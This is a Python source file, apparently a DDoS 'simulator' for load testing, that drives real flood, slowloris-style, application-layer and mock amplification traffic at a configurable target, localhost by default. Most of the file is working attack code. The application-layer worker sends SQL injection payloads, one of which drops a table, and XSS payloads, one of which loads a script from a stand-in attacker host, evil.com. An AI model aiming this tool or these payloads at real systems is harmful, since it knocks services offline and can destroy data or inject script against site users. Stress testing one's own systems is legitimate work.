"""
DDoS Attack Simulator - Real traffic generator for testing
"""
import asyncio
import aiohttp
import websockets
import random
import time
import json
import uuid
from typing import List, Dict, Any
from datetime import datetime
import threading

class DDoSSimulator:
    """Simulates real DDoS attacks with actual network traffic"""
    
    def __init__(self, target_url: str = "ws://localhost:8000/ws"):
        self.target_url = target_url
        self.http_target = target_url.replace("ws://", "http://").replace("/ws", "")
        self.active_connections: List[websockets.WebSocketClientProtocol] = []
        self.attack_active = False
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "bytes_sent": 0,
            "connections_opened": 0,
            "start_time": None,
            "attack_type": None
        }
        
    async def volumetric_flood(self, duration: int = 30, intensity: int = 100):
        """UDP/TCP flood - high volume of packets"""
        self.attack_active = True
        self.stats["attack_type"] = "Volumetric Flood"
        self.stats["start_time"] = datetime.now()
        
        print(f"🚨 Starting Volumetric Flood Attack - Duration: {duration}s, Intensity: {intensity}")
        
        tasks = []
        for i in range(intensity):
            tasks.append(self._flood_worker(i, duration))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.attack_active = False
        return self.stats
    
    async def _flood_worker(self, worker_id: int, duration: int):
        """Worker that sends rapid requests"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.attack_active:
            try:
                # Generate random packet data
                packet_data = {
                    "type": "flood",
                    "worker": worker_id,
                    "timestamp": datetime.now().isoformat(),
                    "payload": "X" * random.randint(100, 1000),  # Variable size payloads
                    "sequence": self.stats["total_requests"]
                }
                
                # Send via WebSocket
                async with websockets.connect(self.target_url) as ws:
                    await ws.send(json.dumps(packet_data))
                    self.stats["total_requests"] += 1
                    self.stats["bytes_sent"] += len(json.dumps(packet_data))
                    self.stats["successful_requests"] += 1
                    
                    # Rapid fire multiple messages
                    for _ in range(10):
                        spam_data = f"FLOOD_{worker_id}_{uuid.uuid4()}"
                        await ws.send(spam_data)
                        self.stats["total_requests"] += 1
                        self.stats["bytes_sent"] += len(spam_data)
                        
            except Exception as e:
                self.stats["failed_requests"] += 1
                
            # Small delay to prevent complete system crash
            await asyncio.sleep(0.001)
    
    async def slowloris_attack(self, duration: int = 60, connections: int = 500):
        """Slowloris - Keep many connections open with partial requests"""
        self.attack_active = True
        self.stats["attack_type"] = "Slowloris"
        self.stats["start_time"] = datetime.now()
        
        print(f"🕷️ Starting Slowloris Attack - Duration: {duration}s, Connections: {connections}")
        
        tasks = []
        for i in range(connections):
            tasks.append(self._slowloris_worker(i, duration))
            await asyncio.sleep(0.01)  # Stagger connection attempts
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.attack_active = False
        return self.stats
    
    async def _slowloris_worker(self, worker_id: int, duration: int):
        """Maintain slow, incomplete connections"""
        end_time = time.time() + duration
        
        try:
            ws = await websockets.connect(self.target_url)
            self.active_connections.append(ws)
            self.stats["connections_opened"] += 1
            
            # Keep connection open with minimal data
            while time.time() < end_time and self.attack_active:
                # Send partial/incomplete data slowly
                partial_data = f"SL_{worker_id}_"
                await ws.send(partial_data)
                self.stats["total_requests"] += 1
                self.stats["bytes_sent"] += len(partial_data)
                
                # Long delay between sends to keep connection alive
                await asyncio.sleep(random.uniform(5, 10))
                
            await ws.close()
            
        except Exception as e:
            self.stats["failed_requests"] += 1
    
    async def application_layer_attack(self, duration: int = 30, threads: int = 50):
        """Application layer - Complex requests that consume server resources"""
        self.attack_active = True
        self.stats["attack_type"] = "Application Layer"
        self.stats["start_time"] = datetime.now()
        
        print(f"💻 Starting Application Layer Attack - Duration: {duration}s, Threads: {threads}")
        
        tasks = []
        for i in range(threads):
            tasks.append(self._application_worker(i, duration))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.attack_active = False
        return self.stats
    
    async def _application_worker(self, worker_id: int, duration: int):
        """Send complex application requests"""
        end_time = time.time() + duration
        
        session = aiohttp.ClientSession()
        
        try:
            while time.time() < end_time and self.attack_active:
                # Complex SQL injection attempts
                sql_payloads = [
                    "' OR '1'='1' UNION SELECT * FROM users--",
                    "'; DROP TABLE packets; --",
                    "' OR 1=1 ORDER BY 1--",
                    "admin' AND SLEEP(5)--",
                    "' UNION ALL SELECT NULL,NULL,NULL--"
                ]
                
                # XSS payloads
                xss_payloads = [
                    "<script>alert('DDoS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://evil.com\\';')",
                    "<svg onload=alert('XSS')>",
                    "<iframe src='javascript:alert(`xss`)'>"
                ]
                
                # Send via API
                try:
                    payload = {
                        "data": random.choice(sql_payloads + xss_payloads),
                        "worker": worker_id,
                        "attack": "application_layer",
                        "nested": {
                            "level1": {"level2": {"level3": "deep" * 100}}  # Deep nesting
                        }
                    }
                    
                    async with session.post(
                        f"{self.http_target}/api/simulate",
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=2)
                    ) as response:
                        self.stats["total_requests"] += 1
                        self.stats["bytes_sent"] += len(json.dumps(payload))
                        if response.status == 200:
                            self.stats["successful_requests"] += 1
                            
                except asyncio.TimeoutError:
                    self.stats["failed_requests"] += 1
                except Exception:
                    self.stats["failed_requests"] += 1
                    
                await asyncio.sleep(0.01)
                
        finally:
            await session.close()
    
    async def amplification_attack(self, duration: int = 30, amplification_factor: int = 10):
        """DNS/NTP amplification simulation"""
        self.attack_active = True
        self.stats["attack_type"] = "Amplification"
        self.stats["start_time"] = datetime.now()
        
        print(f"📢 Starting Amplification Attack - Duration: {duration}s, Factor: {amplification_factor}x")
        
        tasks = []
        for i in range(50):
            tasks.append(self._amplification_worker(i, duration, amplification_factor))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.attack_active = False
        return self.stats
    
    async def _amplification_worker(self, worker_id: int, duration: int, factor: int):
        """Simulate amplified requests"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.attack_active:
            try:
                # Small request that triggers large response
                request_data = {
                    "type": "amplification",
                    "request": "DNS_QUERY",
                    "amplify": factor
                }
                
                async with websockets.connect(self.target_url) as ws:
                    # Send small request
                    await ws.send(json.dumps(request_data))
                    self.stats["total_requests"] += 1
                    self.stats["bytes_sent"] += len(json.dumps(request_data))
                    
                    # Simulate amplified response by sending multiple packets
                    for _ in range(factor):
                        response = f"AMPLIFIED_RESPONSE_{worker_id}_{uuid.uuid4()}" * 10
                        await ws.send(response)
                        self.stats["bytes_sent"] += len(response)
                        self.stats["total_requests"] += 1
                        
                    self.stats["successful_requests"] += 1
                    
            except Exception:
                self.stats["failed_requests"] += 1
                
            await asyncio.sleep(0.05)
    
    async def multi_vector_attack(self, duration: int = 60):
        """Combined multi-vector DDoS attack"""
        self.attack_active = True
        self.stats["attack_type"] = "Multi-Vector"
        self.stats["start_time"] = datetime.now()
        
        print(f"🔥 Starting Multi-Vector DDoS Attack - Duration: {duration}s")
        print("Combining: Volumetric + Slowloris + Application Layer + Amplification")
        
        # Launch all attack types simultaneously
        tasks = [
            self.volumetric_flood(duration, 50),
            self.slowloris_attack(duration, 100),
            self.application_layer_attack(duration, 25),
            self.amplification_attack(duration, 5)
        ]
        
        # Reset stats for multi-vector
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "bytes_sent": 0,
            "connections_opened": 0,
            "start_time": datetime.now(),
            "attack_type": "Multi-Vector"
        }
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.attack_active = False
        return self.stats
    
    def stop_attack(self):
        """Emergency stop for all attacks"""
        print("⛔ Stopping all attacks...")
        self.attack_active = False
        
        # Close all active connections
        for conn in self.active_connections:
            asyncio.create_task(conn.close())
        
        self.active_connections.clear()
        
        return {
            "status": "stopped",
            "stats": self.stats
        }
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current attack statistics"""
        if self.stats["start_time"]:
            duration = (datetime.now() - self.stats["start_time"]).total_seconds()
            rps = self.stats["total_requests"] / duration if duration > 0 else 0
            self.stats["requests_per_second"] = round(rps, 2)
            self.stats["duration"] = duration
            
        return self.stats


async def test_attacks():
    """Test different attack types"""
    simulator = DDoSSimulator()
    
    print("=" * 60)
    print("🎯 DDoS Attack Simulator - Test Mode")
    print("=" * 60)
    
    # Test volumetric flood
    print("\n1. Testing Volumetric Flood (10 seconds)...")
    stats = await simulator.volumetric_flood(duration=10, intensity=20)
    print(f"   Results: {stats['total_requests']} requests, {stats['bytes_sent']} bytes")
    
    await asyncio.sleep(2)
    
    # Test slowloris
    print("\n2. Testing Slowloris (10 seconds)...")
    simulator = DDoSSimulator()  # Reset
    stats = await simulator.slowloris_attack(duration=10, connections=50)
    print(f"   Results: {stats['connections_opened']} connections, {stats['total_requests']} requests")
    
    await asyncio.sleep(2)
    
    # Test application layer
    print("\n3. Testing Application Layer (10 seconds)...")
    simulator = DDoSSimulator()  # Reset
    stats = await simulator.application_layer_attack(duration=10, threads=10)
    print(f"   Results: {stats['total_requests']} requests, {stats['successful_requests']} successful")
    
    print("\n✅ All tests completed!")


if __name__ == "__main__":
    asyncio.run(test_attacks())